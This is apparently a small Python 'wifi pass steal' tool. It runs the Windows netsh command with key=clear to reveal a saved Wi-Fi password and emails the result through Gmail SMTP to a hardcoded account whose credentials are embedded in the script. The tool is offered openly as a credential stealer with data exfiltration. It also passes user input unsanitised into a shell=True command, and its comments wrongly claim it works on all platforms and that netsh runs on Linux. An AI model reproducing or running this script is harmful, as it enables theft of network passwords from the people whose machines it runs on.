#for windows= netsh wlan show profile (wifiname) key=clear
#for linux=netsh wlan show profile
#make your mail as a less secure
import subprocess,smtplib

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls() # tls encrpted form ku because passwd is there
    server.login(email,password) #login
    server.sendmail(email,email,message)
    server.quit()#logout


print("""
 ##--------------------------------------------##
 #|                                            |#
 #|       ****ALL PLATFORMS ****               |#
 #|                                            |#
 #|      SHELL COMMEND EXECUTER>>>             |#
 #                 (wifi pass steal)           |#
 #|                  BY.....                   |#
 #|                                            |#
 #|                    |*| cyber_jawahar       |#
 #|                                            |#
 ##--------------------------------------------##\n
 """)

a=input("ENTER OUR CORRECT WIFINAME>>>")
command="netsh wlan show profile\t"+ a +" key=clear"

output=subprocess.check_output(command,shell=True)
send_mail("anonymous02k2@gmail.com","12345@abcde",output)
